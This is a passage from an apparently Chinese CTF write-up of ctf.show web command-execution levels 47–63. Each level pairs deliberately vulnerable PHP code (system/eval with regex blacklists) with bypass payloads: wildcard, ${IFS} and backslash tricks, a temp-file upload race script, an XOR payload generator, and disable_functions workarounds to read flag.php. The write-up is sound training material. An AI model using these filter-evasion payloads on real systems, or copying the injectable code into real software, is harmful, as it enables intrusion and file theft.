href="#1-19-Web-47-—-过滤-—-绕过" class="headerlink" title="1.19 Web 47 — 过滤 * — ? 绕过"></a>1.19 Web 47 — 过滤 * — ? 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls||?c=tac%09f?ag.php</span><br></pre></td></tr></table></figure><h2 id="1-20-Web-48-—-过滤-—-绕过"><a href="#1-20-Web-48-—-过滤-—-绕过" class="headerlink" title="1.20 Web 48 — 过滤 * — ? 绕过"></a>1.20 Web 48 — 过滤 * — ? 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls||?c=tac%09f?ag.php</span><br></pre></td></tr></table></figure><h2 id="1-21-Web-49-—-过滤-—-绕过"><a href="#1-21-Web-49-—-过滤-—-绕过" class="headerlink" title="1.21 Web 49 — 过滤 * — ? 绕过"></a>1.21 Web 49 — 过滤 * — ? 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls||?c=tac%09f?ag.php</span><br></pre></td></tr></table></figure><h2 id="1-22-Web-50-—-过滤-通配符-—-gt-lt-绕过"><a href="#1-22-Web-50-—-过滤-通配符-—-gt-lt-绕过" class="headerlink" title="1.22 Web 50 — 过滤 通配符 — \ &gt; &lt; 绕过"></a>1.22 Web 50 — 过滤 通配符 — \ &gt; &lt; 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls||?c=nl&lt;fl\ag.php||?c=nl&gt;fl\ag.php||?c=nl&lt;&gt;fl\ag.php||?c=vi&lt;fl\ag.php||<span class="comment">#该题使用通配符不可行</span></span><br></pre></td></tr></table></figure><h2 id="1-23-Web-51-—-过滤-空格、通配符、-—-gt-lt-绕过"><a href="#1-23-Web-51-—-过滤-空格、通配符、-—-gt-lt-绕过" class="headerlink" title="1.23 Web 51 — 过滤 空格、通配符、$ — \ &gt; &lt; 绕过"></a>1.23 Web 51 — 过滤 空格、通配符、$ — \ &gt; &lt; 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls||?c=nl&lt;fl\ag.php||</span><br></pre></td></tr></table></figure><h2 id="1-24-Web-52-—-过滤-空格、通配符、-gt-lt-—-绕过"><a href="#1-24-Web-52-—-过滤-空格、通配符、-gt-lt-—-绕过" class="headerlink" title="1.24 Web 52 — 过滤 空格、通配符、&gt; &lt; — \  $ 绕过"></a>1.24 Web 52 — 过滤 空格、通配符、&gt; &lt; — \  $ 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#禁止了&lt; &gt;,又释放了 $?c=ls||#flag.php index.php ?c=nl$&#123;IFS&#125;fl\ag.php||#flag_here，错误的flag?c=ls$&#123;IFS&#125;/||#bin dev etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var ?c=nl$&#123;IFS&#125;/fl\ag||</span></span><br></pre></td></tr></table></figure><h2 id="1-25-Web-53-—-system-—-nl-IFS-绕过"><a href="#1-25-Web-53-—-system-—-nl-IFS-绕过" class="headerlink" title="1.25 Web 53 — system() — nl \ ${IFS} 绕过"></a>1.25 Web 53 — system() — nl \ ${IFS} 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;        <span class="keyword">echo</span>(<span class="variable">$c</span>);        <span class="variable">$d</span> = system(<span class="variable">$c</span>);        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls<span class="comment">#lsflag.php index.php readflag readflag?c=nl$&#123;IFS&#125;fla\g.php</span></span><br></pre></td></tr></table></figure><h2 id="1-26-Web-54-—-system-—-vi-IFS-绕过"><a href="#1-26-Web-54-—-system-—-vi-IFS-绕过" class="headerlink" title="1.26 Web 54 — system() — vi ${IFS} ? 绕过"></a>1.26 Web 54 — system() — vi ${IFS} ? 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls <span class="comment">#flag.php index.php ?c=vi$&#123;IFS&#125;f???.????c=vi$&#123;IFS&#125;????.???</span></span><br></pre></td></tr></table></figure><h2 id="1-27-Web-55-—-过滤-字母-a-z-—-bin-绕过"><a href="#1-27-Web-55-—-过滤-字母-a-z-—-bin-绕过" class="headerlink" title="1.27 Web 55 — 过滤 字母 [a-z] — /bin/ + ? 绕过"></a>1.27 Web 55 — 过滤 字母 [a-z] — /bin/ + ? 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   <span class="comment">// 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </span></span><br></pre></td></tr></table></figure><p><strong>bin</strong> 为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br>我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是 <code>/bin/ls</code><br><strong>测试：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch flag.phpecho 123 &gt; flag.phpbase64 flag.php/bin/base64 flag.php</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/30/xgpZKh3ToGdwrN1.png" alt="image-20210730181951457"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 /bin/目录?c=/???/????64 ????.???# ?c=/bin/base64 flag.php</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 /usr/bin/目录# 我们可以利用/usr/bin下的**bzip2**,即也就是/usr/bin/bzip2 flag.php# 意思就是说我们先将flag.php文件进行压缩，然后再将其下载?c=/???/???/????2 ????.???# ?c=/usr/bin/bzip2 flag.php# 把flag.php压缩，访问 url + flag.php.bz2 就可以把压缩后的flag.php给下载下来</span></span><br></pre></td></tr></table></figure><h2 id="1-28-Web-56-—-过滤-a-z-0-9-—-POST-包绕过（利用-）"><a href="#1-28-Web-56-—-过滤-a-z-0-9-—-POST-包绕过（利用-）" class="headerlink" title="1.28 Web 56 — 过滤 [a-z] [0-9] — POST 包绕过（利用 . ?）"></a>1.28 Web 56 — 过滤 [a-z] [0-9] — POST 包绕过（利用 . ?）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">// 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</span></span><br></pre></td></tr></table></figure><p><strong>POST 上传包</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。将命令写入文件后，可以利用点. 来执行文件中的命令，例如. file。也可以<span class="built_in">source</span> file，但是这题过滤了字母，因此只能用点。如何正确匹配到我们上传的文件呢？探索过程见p神的文章，最后的利用是/???/????????[@-[]</span><br></pre></td></tr></table></figure><p>文件上传的前端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form  method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;    &lt;input <span class="built_in">type</span>=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;1&quot;</span>&gt;    &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;2&quot;</span>&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;<span class="comment"># 抓包 修改文件内容为 命令</span></span><br></pre></td></tr></table></figure><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p><strong>Python 脚本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsurl = <span class="string">&#x27;http://57601c3a-595e-4ea4-a88c-61daa047e7b0.challenge.ctf.show:8080/&#x27;</span>url += <span class="string">&#x27;?c=. /???/????????[@-[]&#x27;</span><span class="comment">#构造urlwhile True:    r = requests.post(url,files=&#123;&#x27;file&#x27;:(&quot;dota.txt&quot;,&quot;cat flag.php&quot;)&#125;)#以post进行发包    flag = r.text.split(&quot;ctfshow&quot;)#split() 通过指定分隔符对字符串进行切片，如果参数 num 有指定值，则分隔 num+1 个子字符串    if len(flag)&gt;1:#说明flag获得值了！        print(r.text)#打印flag        break#跳出循环</span></span><br></pre></td></tr></table></figure><h2 id="1-29-Web-57-—-过滤-a-z-0-9-—-异或"><a href="#1-29-Web-57-—-过滤-a-z-0-9-—-异或" class="headerlink" title="1.29 Web 57 — 过滤 [a-z] [0-9] . ? — 异或 $(())"></a>1.29 Web 57 — 过滤 [a-z] [0-9] . ? — 异或 $(())</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php// 还能炫的动吗？//flag <span class="keyword">in</span> 36.phpif(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># . ? 均被过滤</span></span><br></pre></td></tr></table></figure><p><strong>无字母、数字终极绕过 — 异或</strong></p><p>双小括号 (( )) 是 Bash Shell 中专门用来进行 <strong>整数运算</strong> 的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。<br>通俗地讲，就是将数学运算表达式放在((和))之间。</p><p>表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。</p><p>可以 <strong>使用$获取 (( )) 命令的结果</strong>，这和使用$获得变量值是类似的。</p><p>可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。</p><p>注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/脚本<span class="comment"># echo $(())0root@kali:~/桌面/脚本# echo $((~$(())))-1root@kali:~/桌面/脚本# echo $((     $((~$(())))       $((~$(())))        ))-2root@kali:~/桌面/脚本# echo $((     $((~$(())))   +    $((~$(())))        ))-2# 想办法构造 36# 关于取反，经验就是如果b=~a，那么a+b=-1# payload?c=$((~$((     $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))        ))))</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 异或脚本 $(())# -*- coding: utf-8 -*-import redef write():    #preg = &#x27;[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;]+&#x27;    preg = &quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;    str = &quot;&quot;    for i in range(1, 256):        for j in range(1, 256):            if not (re.search(preg, chr(i), re.I) or re.search(preg, chr(j), re.I)):                k = i ^ j                if k &gt;= 32 and k &lt;= 126:                    a = &#x27;%&#x27; + hex(i)[2:].zfill(2)                    b = &#x27;%&#x27; + hex(j)[2:].zfill(2)                    str = (str + chr(k) + &quot; &quot; + a + &quot; &quot; + b + &quot;\n&quot;)    fp = open(&#x27;result.txt&#x27;, &#x27;w&#x27;)    fp.write(str)def produce(string):    str1 = &quot;&quot;    str2 = &quot;&quot;    for i in string:        fp = open(&#x27;result.txt&#x27;, &#x27;r&#x27;)        while True:            line = fp.readline()            if line == &quot;&quot;:                break            if line[0] == i:                str1 = str1 + line[2:5]                str2 = str2 + line[6:9]                break        fp.close()    result = &quot;(\&quot;&quot; + str1 + &quot;\&quot;^\&quot;&quot; + str2 + &quot;\&quot;)&quot;    return resultif __name__ == &quot;__main__&quot;:    write()    while True:        function = input(&quot;输出执行函数:&quot;)        parms = input(&quot;请输出函数参数:&quot;)        payload = produce(function) + produce(parms)        print(payload)</span></span><br></pre></td></tr></table></figure><h2 id="1-30-Web-58-—-disable-functions"><a href="#1-30-Web-58-—-disable-functions" class="headerlink" title="1.30 Web 58 — disable_functions"></a>1.30 Web 58 — disable_functions</h2><blockquote><p><strong>open_basedir</strong>：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开</p><p><strong>disable_functions</strong>：用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空</p></blockquote><p>命令执行，突破禁用函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php// 你们在炫技吗？<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];        <span class="built_in">eval</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用最常见的 c=system(&#x27;ls&#x27;);# 得到Warning: system() has been disabled for security reasons in /var/www/html/index.php(17) : eval()&#x27;d code on line 1# 函数被禁用</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先尝试不使用 命令执行的函数  # 套娃 函数套用c=print_r(scandir(current(localeconv())));c=print_r(scandir(dirname(&#x27;__FILE__&#x27;)));# Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php )c=highlight_file(next(array_reverse(scandir(current(localeconv())))));c=highlight_file(&#x27;flag.php&#x27;);c=show_source(&#x27;flag.php&#x27;);</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绕disable_functions# 利用 读文件 的函数file_get_contents()highlight_file()show_source()fgets()file()var_dump()readfile()# 利用c=echo file_get_contents(&#x27;flag.php&#x27;);c=highlight_file(&#x27;flag.php&#x27;);c=show_source(&#x27;flag.php&#x27;);c=readfile(&#x27;flag.php&#x27;);c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while($b=fgets($a))&#123;echo $b;&#125;c=$handle=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;c=$handle=fopen(&#x27;flag.php&#x27;,&#x27;r&#x27;);echo fread($handle,1000);</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 复制 重命名copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);            rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);# 即c=copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);# 后访问 URL/flag.txt 即可</span></span><br></pre></td></tr></table></figure><h2 id="1-31-Web-59-—-disable-functions"><a href="#1-31-Web-59-—-disable-functions" class="headerlink" title="1.31 Web 59 — disable_functions"></a>1.31 Web 59 — disable_functions</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php// 你们在炫技吗？<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];        <span class="built_in">eval</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;</span><br></pre></td></tr></table></figure><p>禁用了一些函数，不过仍可绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(<span class="string">&#x27;flag.php&#x27;</span>);c=highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="1-32-Web-60-—-disable-functions"><a href="#1-32-Web-60-—-disable-functions" class="headerlink" title="1.32 Web 60 — disable_functions"></a>1.32 Web 60 — disable_functions</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php// 你们在炫技吗？<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];        <span class="built_in">eval</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="1-33-Web-61-—-disable-functions"><a href="#1-33-Web-61-—-disable-functions" class="headerlink" title="1.33 Web 61 — disable_functions"></a>1.33 Web 61 — disable_functions</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php// 你们在炫技吗？<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];        <span class="built_in">eval</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="1-34-Web-62-—-disable-functions"><a href="#1-34-Web-62-—-disable-functions" class="headerlink" title="1.34 Web 62 — disable_functions"></a>1.34 Web 62 — disable_functions</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php// 你们在炫技吗？<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];        <span class="built_in">eval</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=show_source(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="1-35-Web-63-—-disable-functions"><a href="#1-35-Web-63-—-disable-functions" class="headerlink" title="1.35 Web 63 — disable_functions"></a>1.35 Web 63 — disable_functions</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php// 你们在炫技吗？<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];        <span class="built_in">eval</span>(<span class="variable">$c</span>);&#125;<span 